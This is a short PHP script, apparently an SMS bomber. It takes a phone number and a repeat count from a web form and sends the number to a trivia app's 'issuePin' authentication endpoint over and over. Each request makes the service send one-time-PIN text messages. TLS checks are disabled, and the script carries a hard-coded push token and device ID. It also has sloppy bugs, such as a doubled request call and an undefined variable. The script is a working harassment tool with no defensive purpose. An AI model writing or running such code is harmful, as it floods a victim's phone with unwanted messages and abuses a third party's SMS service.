<?php

$no = $_POST["no"];
$loop = $_POST["loop"];
$x = 0;
$data = array("applicationInfo" => "ANDROID", "country" => "ID", "deviceModel" => "ASUS_X00AD", "locale" => "in_ID", "method" => "SMS", "networkCode" => "51001", "phoneNumber" => "$no", "udid" => "f0d2f0e4a35230410424e0c5f519361b019ef56924f690349dcbc7d32636ab31");
$post = json_encode($data);
while($x < $loop) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.triviago.me/api/v1.0/auth/issuePin");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$headers = array();
		$headers[] = "Content-Type: application/json; charset=UTF-8";
		$headers[] = "x-tgo-pushtoken: cozEbCf2_1I:APA91bG8srl00mwgEWAo8q20gzvkEABzuhn1pCcx8v3qsXX2mLaiLb26ImHLsn0cZ-GzMjQvX505HzacfyOCPuY97U6hIEugKDyfkblzvKFLEMaYej6aq1QNWNbxFg9sZuOiSjrUuCtR";
		$headers[] = "x-tgo-pushtype: GCM";
        $headers[] = "x-tgo-timezoneid: Asia/Jakarta";
        $headers[] = "x-tgo-serviceid: tgoid";
        $headers[] = "Accept-Language: in";
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
echo "Success Nganu <br> $body <br>";
curl_exec($ch);
$x++;
if(curl_exec($ch)){
    continue;
    }
}

?>